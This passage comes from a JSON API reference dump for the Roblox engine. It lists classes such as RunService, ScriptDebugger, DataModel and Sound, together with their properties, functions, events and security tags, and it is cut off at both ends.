ags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"RenderSettings","tags":["notbrowsable"]},{"ValueType":"AASamples","type":"Property","Name":"AASamples","tags":[],"Class":"RenderSettings"},{"ValueType":"Antialiasing","type":"Property","Name":"Antialiasing","tags":[],"Class":"RenderSettings"},{"ValueType":"int","type":"Property","Name":"AutoFRMLevel","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"DebugDisableInterpolation","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"EagerBulkExecution","tags":[],"Class":"RenderSettings"},{"ValueType":"QualityLevel","type":"Property","Name":"EditQualityLevel","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"EnableFRM","tags":["hidden"],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ExportMergeByMaterial","tags":[],"Class":"RenderSettings"},{"ValueType":"FramerateManagerMode","type":"Property","Name":"FrameRateManager","tags":[],"Class":"RenderSettings"},{"ValueType":"GraphicsMode","type":"Property","Name":"GraphicsMode","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"IsAggregationShown","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"IsSynchronizedWithPhysics","tags":[],"Class":"RenderSettings"},{"ValueType":"int","type":"Property","Name":"MeshCacheSize","tags":[],"Class":"RenderSettings"},{"ValueType":"QualityLevel","type":"Property","Name":"QualityLevel","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ReloadAssets","tags":[],"Class":"RenderSettings"},{"ValueType":"Resolution","type":"Property","Name":"Resolution","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ShowBoundingBoxes","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ShowInterpolationpath","tags":[],"Class":"RenderSettings"},{"ValueType":"int","type":"Property","Name":"TextureCacheSize","tags":[],"Class":"RenderSettings"},{"ReturnType":"int","Arguments":[],"Name":"GetMaxQualityLevel","tags":[],"Class":"RenderSettings","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"ReplicatedFirst","tags":["notCreatable"]},{"ReturnType":"bool","Arguments":[],"Name":"IsDefaultLoadingGuiRemoved","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsFinishedReplicating","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RemoveDefaultLoadingScreen","tags":[],"Class":"ReplicatedFirst","type":"Function"},{"Arguments":[],"Name":"FinishedReplicating","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Event"},{"Arguments":[],"Name":"RemoveDefaultLoadingGuiSignal","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ReplicatedStorage","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"RobloxReplicatedStorage","tags":["notCreatable","notbrowsable"]},{"Superclass":"Instance","type":"Class","Name":"RunService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"int","Name":"priority","Default":null},{"Type":"Function","Name":"function","Default":null}],"Name":"BindToRenderStep","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsClient","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsRunMode","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsRunning","tags":["RobloxScriptSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsServer","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsStudio","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Pause","tags":["PluginSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Reset","tags":["PluginSecurity","deprecated"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Run","tags":["PluginSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Stop","tags":["PluginSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"UnbindFromRenderStep","tags":[],"Class":"RunService","type":"Function"},{"Arguments":[{"Name":"step","Type":"double"}],"Name":"Heartbeat","tags":[],"Class":"RunService","type":"Event"},{"Arguments":[{"Name":"step","Type":"double"}],"Name":"RenderStepped","tags":[],"Class":"RunService","type":"Event"},{"Arguments":[{"Name":"time","Type":"double"},{"Name":"step","Type":"double"}],"Name":"Stepped","tags":[],"Class":"RunService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"RuntimeScriptService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ScriptContext","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"ScriptsDisabled","tags":["LocalUserSecurity"],"Class":"ScriptContext"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetId","Default":null},{"Type":"Instance","Name":"parent","Default":null},{"Type":"string","Name":"name","Default":null}],"Name":"AddCoreScript","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Instance","Name":"parent","Default":null}],"Name":"AddCoreScriptLocal","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"AddStarterScript","tags":["LocalUserSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"bool","Name":"clearHighwaterMark","Default":"true"}],"Name":"GetHeapStats","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetScriptStats","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":"false"}],"Name":"SetCollectScriptStats","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"seconds","Default":null}],"Name":"SetTimeout","tags":["PluginSecurity"],"Class":"ScriptContext","type":"Function"},{"Arguments":[{"Name":"object","Type":"Instance"},{"Name":"member","Type":"string"},{"Name":"script","Type":"Instance"}],"Name":"CamelCaseViolation","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"stackTrace","Type":"string"},{"Name":"script","Type":"Instance"}],"Name":"Error","tags":[],"Class":"ScriptContext","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ScriptDebugger","tags":["notCreatable"]},{"ValueType":"int","type":"Property","Name":"CurrentLine","tags":["readonly"],"Class":"ScriptDebugger"},{"ValueType":"bool","type":"Property","Name":"IsDebugging","tags":["readonly"],"Class":"ScriptDebugger"},{"ValueType":"bool","type":"Property","Name":"IsPaused","tags":["readonly"],"Class":"ScriptDebugger"},{"ValueType":"Object","type":"Property","Name":"Script","tags":["readonly"],"Class":"ScriptDebugger"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"expression","Default":null}],"Name":"AddWatch","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetBreakpoints","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Map","Arguments":[],"Name":"GetGlobals","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Map","Arguments":[{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"GetLocals","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetStack","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Map","Arguments":[{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"GetUpvalues","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"Instance","Name":"watch","Default":null}],"Name":"GetWatchValue","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetWatches","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Resume","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"line","Default":null}],"Name":"SetBreakpoint","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetGlobal","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Variant","Name":"value","Default":null},{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"SetLocal","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Variant","Name":"value","Default":null},{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"SetUpvalue","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepIn","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOut","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOver","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"Arguments":[{"Name":"breakpoint","Type":"Instance"}],"Name":"BreakpointAdded","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"breakpoint","Type":"Instance"}],"Name":"BreakpointRemoved","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"line","Type":"int"}],"Name":"EncounteredBreak","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[],"Name":"Resuming","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"watch","Type":"Instance"}],"Name":"WatchAdded","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"watch","Type":"Instance"}],"Name":"WatchRemoved","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ScriptInformationProvider","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"access","Default":null}],"Name":"SetAccessKey","tags":["RobloxSecurity"],"Class":"ScriptInformationProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetAssetUrl","tags":["LocalUserSecurity"],"Class":"ScriptInformationProvider","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"ScriptService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Selection","tags":[]},{"ReturnType":"Objects","Arguments":[],"Name":"Get","tags":["PluginSecurity"],"Class":"Selection","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"selection","Default":null}],"Name":"Set","tags":["PluginSecurity"],"Class":"Selection","type":"Function"},{"Arguments":[],"Name":"SelectionChanged","tags":[],"Class":"Selection","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ServerScriptService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ServerStorage","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ServiceProvider","tags":["notbrowsable"]},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"FindService","tags":[],"Class":"ServiceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"GetService","tags":[],"Class":"ServiceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"getService","tags":["deprecated"],"Class":"ServiceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"service","tags":["deprecated"],"Class":"ServiceProvider","type":"Function"},{"Arguments":[],"Name":"Close","tags":[],"Class":"ServiceProvider","type":"Event"},{"Arguments":[],"Name":"CloseLate","tags":["LocalUserSecurity"],"Class":"ServiceProvider","type":"Event"},{"Arguments":[{"Name":"service","Type":"Instance"}],"Name":"ServiceAdded","tags":[],"Class":"ServiceProvider","type":"Event"},{"Arguments":[{"Name":"service","Type":"Instance"}],"Name":"ServiceRemoving","tags":[],"Class":"ServiceProvider","type":"Event"},{"Superclass":"ServiceProvider","type":"Class","Name":"DataModel","tags":[]},{"ValueType":"int","type":"Property","Name":"CreatorId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"CreatorType","type":"Property","Name":"CreatorType","tags":["readonly"],"Class":"DataModel"},{"ValueType":"GearGenreSetting","type":"Property","Name":"GearGenreSetting","tags":["readonly"],"Class":"DataModel"},{"ValueType":"Genre","type":"Property","Name":"Genre","tags":["readonly"],"Class":"DataModel"},{"ValueType":"bool","type":"Property","Name":"IsPersonalServer","tags":["RobloxScriptSecurity"],"Class":"DataModel"},{"ValueType":"string","type":"Property","Name":"JobId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"bool","type":"Property","Name":"LocalSaveEnabled","tags":["RobloxScriptSecurity","readonly"],"Class":"DataModel"},{"ValueType":"int","type":"Property","Name":"PlaceId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"int","type":"Property","Name":"PlaceVersion","tags":["readonly"],"Class":"DataModel"},{"ValueType":"string","type":"Property","Name":"VIPServerId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"int","type":"Property","Name":"VIPServerOwnerId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"Object","type":"Property","Name":"Workspace","tags":["readonly"],"Class":"DataModel"},{"ValueType":"Object","type":"Property","Name":"lighting","tags":["deprecated","readonly"],"Class":"DataModel"},{"ValueType":"Object","type":"Property","Name":"workspace","tags":["deprecated","readonly"],"Class":"DataModel"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"displayName","Default":null},{"Type":"string","Name":"stat","Default":null}],"Name":"AddStat","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ClearMessage","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"localSave","Default":null}],"Name":"FinishShutdown","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"jobname","Default":null},{"Type":"double","Name":"greaterThan","Default":null}],"Name":"GetJobIntervalPeakFraction","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"jobname","Default":null},{"Type":"double","Name":"greaterThan","Default":null}],"Name":"GetJobTimePeakFraction","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetJobsExtendedStats","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetJobsInfo","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetMessage","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetRemoteBuildMode","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"bool","Name":"synchronous","Default":"false"}],"Name":"HttpGet","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"bool","Name":"synchronous","Default":"false"},{"Type":"string","Name":"contentType","Default":"*/*"}],"Name":"HttpPost","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"GearType","Name":"gearType","Default":null}],"Name":"IsGearTypeAllowed","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsLoaded","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Content","Name":"url","Default":null}],"Name":"Load","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetID","Default":null}],"Name":"LoadGame","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"LoadPlugins","tags":["RobloxSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetID","Default":null}],"Name":"LoadWorld","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"stat","Default":null}],"Name":"RemoveStat","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"category","Default":null},{"Type":"string","Name":"action","Default":"custom"},{"Type":"string","Name":"label","Default":"none"},{"Type":"int","Name":"value","Default":"0"}],"Name":"ReportInGoogleAnalytics","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"id","Default":null},{"Type":"string","Name":"key1","Default":null},{"Type":"string","Name":"value1","Default":null},{"Type":"string","Name":"key2","Default":null},{"Type":"string","Name":"value2","Default":null}],"Name":"ReportMeasurement","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Content","Name":"url","Default":null}],"Name":"Save","tags":["RobloxSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SaveStats","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ServerSave","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"creatorID","Default":null},{"Type":"CreatorType","Name":"creatorType","Default":null}],"Name":"SetCreatorID","tags":["PluginSecurity","deprecated"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"creatorId","Default":null},{"Type":"CreatorType","Name":"creatorType","Default":null}],"Name":"SetCreatorId","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"GearGenreSetting","Name":"genreRestriction","Default":null},{"Type":"int","Name":"allowedGenres","Default":null}],"Name":"SetGearSettings","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Genre","Name":"genre","Default":null}],"Name":"SetGenre","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"seconds","Default":null}],"Name":"SetJobsExtendedStatsWindow","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null}],"Name":"SetMessage","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SetMessageBrickCount","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeID","Default":null},{"Type":"bool","Name":"robloxPlace","Default":"false"}],"Name":"SetPlaceID","tags":["PluginSecurity","deprecated"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"bool","Name":"robloxPlace","Default":"false"}],"Name":"SetPlaceId","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"SetPlaceVersion","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"buildModeEnabled","Default":null}],"Name":"SetRemoteBuildMode","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"info","Default":null}],"Name":"SetScreenshotInfo","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetServerSaveUrl","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"universeId","Default":null}],"Name":"SetUniverseId","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"newId","Default":null}],"Name":"SetVIPServerId","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"newId","Default":null}],"Name":"SetVIPServerOwnerId","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"info","Default":null}],"Name":"SetVideoInfo","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Shutdown","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ToggleTools","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"HttpGetAsync","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"string","Name":"contentType","Default":"*/*"}],"Name":"HttpPostAsync","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"SaveFilter","Name":"saveFilter","Default":"SaveAll"}],"Name":"SavePlace","tags":[],"Class":"DataModel","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[],"Name":"SaveToRoblox","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"YieldFunction"},{"Arguments":[],"Name":"AllowedGearTypeChanged","tags":[],"Class":"DataModel","type":"Event"},{"Arguments":[{"Name":"betterQuality","Type":"bool"}],"Name":"GraphicsQualityChangeRequest","tags":[],"Class":"DataModel","type":"Event"},{"Arguments":[{"Name":"object","Type":"Instance"},{"Name":"descriptor","Type":"Property"}],"Name":"ItemChanged","tags":[],"Class":"DataModel","type":"Event"},{"Arguments":[],"Name":"Loaded","tags":[],"Class":"DataModel","type":"Event"},{"ReturnType":"Tuple","Arguments":[],"Name":"OnClose","tags":[],"Class":"DataModel","type":"Callback"},{"ReturnType":"bool","Arguments":[],"Name":"RequestShutdown","tags":["RobloxScriptSecurity","noyield"],"Class":"DataModel","type":"Callback"},{"Superclass":"ServiceProvider","type":"Class","Name":"GenericSettings","tags":[]},{"Superclass":"GenericSettings","type":"Class","Name":"GlobalSettings","tags":["notbrowsable"]},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"GetFFlag","tags":[],"Class":"GlobalSettings","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"GetFVariable","tags":[],"Class":"GlobalSettings","type":"Function"},{"ReturnType":"Dictionary","Arguments":[],"Name":"GetFVariables","tags":["RobloxScriptSecurity"],"Class":"GlobalSettings","type":"Function"},{"Superclass":"GenericSettings","type":"Class","Name":"UserSettings","tags":[]},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"IsUserFeatureEnabled","tags":[],"Class":"UserSettings","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Reset","tags":[],"Class":"UserSettings","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Sky","tags":[]},{"ValueType":"bool","type":"Property","Name":"CelestialBodiesShown","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxBk","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxDn","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxFt","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxLf","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxRt","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxUp","tags":[],"Class":"Sky"},{"ValueType":"int","type":"Property","Name":"StarCount","tags":[],"Class":"Sky"},{"Superclass":"Instance","type":"Class","Name":"Smoke","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Color","tags":[],"Class":"Smoke"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Smoke"},{"ValueType":"float","type":"Property","Name":"Opacity","tags":[],"Class":"Smoke"},{"ValueType":"float","type":"Property","Name":"RiseVelocity","tags":[],"Class":"Smoke"},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"Smoke"},{"Superclass":"Instance","type":"Class","Name":"SocialService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"bestFriendUrl","Default":null}],"Name":"SetBestFriendUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"friendUrl","Default":null}],"Name":"SetFriendUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"groupRankUrl","Default":null}],"Name":"SetGroupRankUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"groupRoleUrl","Default":null}],"Name":"SetGroupRoleUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"groupUrl","Default":null}],"Name":"SetGroupUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"stuffUrl","Default":null}],"Name":"SetPackageContentsUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"stuffUrl","Default":null}],"Name":"SetStuffUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Sound","tags":[]},{"ValueType":"bool","type":"Property","Name":"IsPaused","tags":["readonly"],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"IsPlaying","tags":["readonly"],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"Looped","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"MaxDistance","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"MinDistance","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"Pitch","tags":[],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"PlayOnRemove","tags":[],"Class":"Sound"},{"ValueType":"Content","type":"Property","Name":"SoundId","tags":[],"Class":"Sound"},{"ValueType":"double","type":"Property","Name":"TimeLength","tags":["readonly"],"Class":"Sound"},{"ValueType":"double","type":"Property","Name":"TimePosition","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"Volume","tags":[],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"isPlaying","tags":["deprecated","readonly"],"Class":"Sound"},{"ReturnType":"void","Arguments":[],"Name":"Pause","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Play","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Resume","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Stop","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"pause","tags":["deprecated"],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"play","tags":["deprecated"],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"stop","tags":["deprecated"],"Class":"Sound","type":"Function"},{"Arguments":[{"Name":"soundId","Type":"string"},{"Name":"numOfTimesLooped","Type":"int"}],"Name":"DidLoop","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Ended","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Paused","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Played","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Stopped","tags":[],"Class":"Sound","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"SoundService","tags":["notCreatable"]},{"ValueType":"ReverbType","type":"Property","Name":"AmbientReverb","tags":[],"Class":"SoundService"},{"ValueType":"float","type":"Property","Name":"DistanceFactor","tags":[],"Class":"SoundService"},{"ValueType":"float","type":"Property","Name":"DopplerScale","tags":[],"Class":"SoundService"},{"ValueType":"float","type":"Property","Name":"RolloffScale","tags":[],"Class":"SoundService"},{"ReturnType":"Tuple","Arguments":[],"Name":"GetListener","tags":[],"Class":"SoundService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"SoundType","Name":"sound","Default":null}],"Name":"PlayStockSound","tags":["RobloxScriptSecurity"],"Class":"SoundService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"ListenerType","Name":"listenerType","Default":null},{"Type":"Tuple","Name":"listener","Default":null}],"Name":"SetList